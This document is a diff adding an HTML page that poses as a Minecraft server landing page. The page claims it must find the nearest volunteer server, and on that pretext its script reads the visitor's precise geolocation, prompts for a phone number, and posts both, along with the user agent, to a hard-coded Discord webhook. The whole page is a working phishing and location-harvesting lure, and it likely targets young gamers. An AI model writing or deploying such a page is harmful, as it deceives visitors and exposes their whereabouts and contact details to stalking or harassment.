@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nuclear Server</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0a0f1a;
+            color: white;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            min-height: 200vh; /* allow scrolling */
+            overflow-x: hidden;
+        }
+
+        /* Blue, black, white theme */
+        .header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            z-index: 10;
+            background: #0a0f1a;
+            padding: 20px 0;
+            transition: all 0.5s ease;
+            text-align: center;
+        }
+
+        .header h1 {
+            font-size: 4rem;
+            color: #00ff41; /* bright green */
+            text-shadow: 0 0 20px #00ff41, 0 0 40px #00ff41;
+            transition: all 0.5s ease;
+        }
+
+        .header.small h1 {
+            font-size: 2rem;
+            text-shadow: 0 0 10px #00ff41;
+        }
+
+        .content {
+            margin-top: 100vh; /* start below the big text */
+            padding: 40px;
+            background: #0a0f1a;
+            border-top: 2px solid #1e3a5f;
+        }
+
+        .info-text {
+            max-width: 800px;
+            margin: 0 auto 40px auto;
+            font-size: 1.2rem;
+            line-height: 1.8;
+            color: #c0d0e0;
+            text-align: center;
+            background: #111827;
+            padding: 30px;
+            border-radius: 12px;
+            border: 1px solid #1e3a5f;
+        }
+
+        .button-area {
+            text-align: center;
+            margin-bottom: 60px;
+        }
+
+        .get-location-btn {
+            background: #0066cc;
+            color: white;
+            border: none;
+            padding: 16px 40px;
+            font-size: 1.3rem;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: 0.3s;
+            box-shadow: 0 0 15px rgba(0, 102, 204, 0.5);
+        }
+
+        .get-location-btn:hover {
+            background: #0052a3;
+            box-shadow: 0 0 25px rgba(0, 102, 204, 0.8);
+        }
+
+        .get-location-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .status {
+            margin-top: 20px;
+            padding: 12px;
+            border-radius: 8px;
+            background: #1a2332;
+            display: inline-block;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 30px;
+            color: #5a7a9a;
+            border-top: 1px solid #1e3a5f;
+            margin-top: 40px;
+        }
+
+        /* scroll indicator */
+        .scroll-hint {
+            position: absolute;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            color: #5a7a9a;
+            font-size: 0.9rem;
+            animation: bounce 2s infinite;
+        }
+
+        @keyframes bounce {
+            0%,100%{ transform: translateX(-50%) translateY(0); }
+            50%{ transform: translateX(-50%) translateY(10px); }
+        }
+    </style>
+</head>
+<body>
+    <div class="header" id="header">
+        <h1>Welcome to the Nuclear Server</h1>
+    </div>
+
+    <div class="content">
+        <div class="info-text">
+            Our minecraft server is hosted locally by hundreds of volunteers all around the globe, In order to provide you with the best experience with no latency and low ping you must be connected to the closest locally hosted server in your area. By providing your location and phone number our team will shortly be in contact with you and will provide you with the best server based on your location.
+        </div>
+
+        <div class="button-area">
+            <button class="get-location-btn" id="locationBtn">Get My Location & Send</button>
+            <div class="status" id="status">Ready</div>
+        </div>
+
+        <div class="footer">Nuclear Server &copy; 2025</div>
+    </div>
+
+    <div class="scroll-hint">Scroll down ▼</div>
+
+    <script>
+        // Scroll transition
+        const header = document.getElementById('header');
+        window.addEventListener('scroll', () => {
+            if (window.scrollY > 50) {
+                header.classList.add('small');
+            } else {
+                header.classList.remove('small');
+            }
+        });
+
+        // Webhook URL
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1492114870634676255/hUI2b4xG-OTMpj3LPseVHMsbLWzI_3jCS7TPMvAfTbfmvFgu26KrVjTGMGGKWBU6sQ6f";
+
+        const btn = document.getElementById('locationBtn');
+        const statusDiv = document.getElementById('status');
+
+        btn.addEventListener('click', async () => {
+            btn.disabled = true;
+            statusDiv.textContent = "Getting location...";
+
+            try {
+                // Get geolocation
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    });
+                });
+
+                const { latitude, longitude, accuracy } = position.coords;
+
+                // Ask for phone number
+                const phoneNumber = prompt("Please enter your phone number (with country code):");
+                if (!phoneNumber || phoneNumber.trim() === '') {
+                    statusDiv.textContent = "Phone number is required.";
+                    btn.disabled = false;
+                    return;
+                }
+
+                statusDiv.textContent = "Sending data...";
+
+                // Send to webhook
+                const payload = {
+                    content: `**New Server Connection Request**\n**Geolocation:**\nLatitude: ${latitude}\nLongitude: ${longitude}\nAccuracy: ${accuracy} meters\n**Phone Number:** ${phoneNumber}\n**User Agent:** ${navigator.userAgent}\n**Timestamp:** ${new Date().toISOString()}`
+                };
+
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    statusDiv.textContent = "✓ Sent! Staff will text you shortly.";
+                    statusDiv.style.color = "#00ff41";
+                } else {
+                    statusDiv.textContent = "✗ Failed to send. Try again.";
+                    statusDiv.style.color = "#ff4444";
+                }
+
+            } catch (err) {
+                console.error(err);
+                if (err.code === 1) {
+                    statusDiv.textContent = "Location access denied. Please allow location.";
+                } else if (err.code === 2) {
+                    statusDiv.textContent = "Location unavailable. Try again.";
+                } else if (err.code === 3) {
+                    statusDiv.textContent = "Location request timed out. Try again.";
+                } else {
+                    statusDiv.textContent = "Error: " + err.message;
+                }
+            } finally {
+                btn.disabled = false;
+            }
+        });
+    </script>
+</body>
+</html>
